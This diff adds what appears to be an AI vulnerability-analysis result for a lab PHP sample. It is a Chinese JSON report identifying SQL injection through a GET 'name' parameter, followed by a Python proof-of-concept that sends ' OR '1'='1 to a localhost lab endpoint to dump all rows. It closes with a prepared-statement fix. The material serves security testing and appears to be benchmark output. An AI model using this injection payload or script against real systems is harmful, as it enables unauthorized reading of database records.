@@ -1,0 +1,108 @@
+```json
+{
+  "sample_id": "S001",
+  "prediction": "vulnerable",
+  "vulnerability_type": "SQL注入",
+  "locations": ["F01:0007", "F01:0010", "F01:0011"],
+  "evidence": {
+    "source": "F01:0007 使用 $_GET['name'] 读取外部输入，未做过滤或类型约束。",
+    "flow": "F01:0010 将 $name 直接拼接到 WHERE name = '...' 的 SQL 字符串中；F01:0011 将该动态 SQL 交给 $db->query($sql) 执行。",
+    "guard": "无效：当前样本未见绑定参数、白名单、转义或过滤；F01:0010 是直接字符串拼接。",
+    "sink": "F01:0011 的 $db->query($sql) 执行动态构造的 SQL，外部输入可改变查询语法结构。"
+  },
+  "prerequisites": [
+    "入口 http://127.0.0.1:4280/lab_cases/S001/index.php 可访问",
+    "common/db_connect.php 成功提供已连接的 mysqli 变量 $db",
+    "lab_people 表存在且预置 1 Alice、2 Bob、3 Carol",
+    "无需登录"
+  ],
+  "missing_context": [
+    "common/db_connect.php 的具体实现未提供；但当前样本已显示 $db->query($sql) 执行路径，不影响对拼接执行点的判断。"
+  ],
+  "poc_generated": true,
+  "poc_language": "python3",
+  "poc_instructions": "运行：保存脚本后执行 python3 脚本名.py。目标固定为 http://127.0.0.1:4280/lab_cases/S001/index.php，脚本拒绝重定向且不访问其他主机。普通业务对照：GET name=Alice，预期解析记录仅为 (1,Alice)。测试步骤：GET name=%27%20OR%20%271%27%3D%271，即 name=' OR '1'='1，预期解析记录包含 (1,Alice)、(2,Bob)、(3,Carol)，且与普通记录不同。预期安全影响：WHERE 条件被逻辑或绕过，可读取全表记录；该测试不修改数据。观察者应看到：浏览器/响应正文普通仅显示 ID 1：Alice，测试出现 ID 2：Bob 和 ID 3：Carol；数据库记录不变。成功断言比较解析后的实际业务记录集合，不以 HTTP 200 作为成功条件。无法判断的前提：入口不可达、连接失败、表数据被改动、HTML 结构变化、重定向被拦截、SQL 模式或字符集导致 payload 不生效。"
+}
+```
+
+```python
+#!/usr/bin/env python3
+import html as htmlmod
+import re
+import sys
+import urllib.error
+import urllib.parse
+import urllib.request
+
+BASE = "http://127.0.0.1:4280/lab_cases/S001/index.php"
+EXPECTED_NORMAL = {("1", "Alice")}
+EXPECTED_TEST_KEYS = {("1", "Alice"), ("2", "Bob"), ("3", "Carol")}
+
+
+class BlockRedirect(urllib.request.HTTPRedirectHandler):
+    def redirect_request(self, req, fp, code, msg, headers, newurl):
+        raise urllib.error.HTTPError(
+            req.full_url,
+            code,
+            f"blocked redirect to {newurl}",
+            headers,
+            fp,
+        )
+
+
+OPENER = urllib.request.build_opener(BlockRedirect())
+
+
+def fetch(name):
+    query = urllib.parse.urlencode({"name": name})
+    req = urllib.request.Request(BASE + "?" + query, method="GET")
+    with OPENER.open(req, timeout=10) as resp:
+        return resp.status, resp.read().decode("utf-8", "replace")
+
+
+def parse_records(body):
+    records = []
+    for m in re.finditer(r"<p>\s*ID\s*([^：<]+)：\s*(.*?)\s*</p>", body, re.S):
+        rid = htmlmod.unescape(m.group(1)).strip()
+        rname = htmlmod.unescape(m.group(2)).strip()
+        records.append((rid, rname))
+    return records
+
+
+def main():
+    try:
+        status_normal, body_normal = fetch("Alice")
+        normal = parse_records(body_normal)
+
+        status_test, body_test = fetch("' OR '1'='1")
+        test = parse_records(body_test)
+    except Exception as exc:
+        print(f"请求失败或重定向被拒绝：{exc}", file=sys.stderr)
+        print("请检查入口、common/db_connect.php、MariaDB、lab_people 数据和网络。", file=sys.stderr)
+        return 2
+
+    print("普通响应状态:", status_normal)
+    print("普通记录:", normal)
+    print("测试响应状态:", status_test)
+    print("测试记录:", test)
+
+    ok_normal = set(normal) == EXPECTED_NORMAL
+    ok_test = EXPECTED_TEST_KEYS.issubset(set(test)) and set(test) != set(normal)
+
+    if ok_normal and ok_test:
+        print("成功：普通请求仅返回 Alice；测试输入返回包含 Bob、Carol 的额外记录。")
+        print("数据库预期：数据未被修改；观察者应在浏览器/响应正文看到普通仅 ID 1：Alice，测试出现 ID 2：Bob 和 ID 3：Carol。")
+        return 0
+
+    print("未能判定：普通或测试记录不符合预期。", file=sys.stderr)
+    print("请检查连接、表数据、HTML 结构、重定向拦截或 SQL 模式。", file=sys.stderr)
+    print("普通预期:", EXPECTED_NORMAL, file=sys.stderr)
+    print("测试预期至少包含:", EXPECTED_TEST_KEYS, file=sys.stderr)
+    return 1
+
+
+if __name__ == "__main__":
+    sys.exit(main())
+```
+
+防护建议：使用 mysqli 预处理语句并将 `name` 作为绑定值传入；不要将外部输入拼接进 SQL 结构。
